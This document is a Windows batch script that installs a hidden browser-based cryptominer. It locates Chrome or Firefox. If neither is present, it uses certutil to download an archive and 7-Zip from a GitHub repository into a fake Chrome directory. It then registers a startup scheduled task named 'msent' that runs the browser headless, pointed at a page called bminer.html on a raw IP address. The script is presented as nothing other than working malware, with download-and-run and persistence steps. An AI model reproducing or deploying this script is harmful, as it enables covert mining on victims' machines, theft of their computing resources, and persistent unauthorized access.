set process=%HOMEDRIVE%\%homepath%\appdata\Local\Google\Chrome\Application\chrome.exe
if exist "%process%" goto chrome
set process=C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
if exist "%process%" goto chrome
set process=C:\Program Files\Google\Chrome\Application\chrome.exe
if exist "%process%" goto chrome

set process=C:\Program Files (x86)\Mozilla Firefox\firefox.exe
if exist "%process%" goto firefox
set process=C:\Program Files\Mozilla Firefox\firefox.exe
if exist "%process%" goto firefox

set process=C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
mkdir "%programfiles% (x86)\Google\Chrome\"
cd "%programfiles% (x86)\Google\Chrome\"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/good5068/tools/master/Application.zip.002 file.zip.002
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/good5068/tools/master/Application.zip.001 file.zip.001
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/good5068/tools/master/7z.exe 7z.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/good5068/tools/master/7z.dll 7z.dll
7z x file.zip.001
goto chrome

:chrome
schtasks /create /tn msent  /sc onstart  /f /tr "'%process%' --headless --remote-debugging-port=9223 http://198.13.46.244/bminer.html"
schtasks /run /i /tn msent
goto end

:firefox
%process%" -createprofile profile_name
schtasks /create /tn msent  /sc onstart  /f /tr "'%process%' -p profile_name -no-remote -headless http://198.13.46.244/bminer.html"
schtasks /run /i /tn msent

:end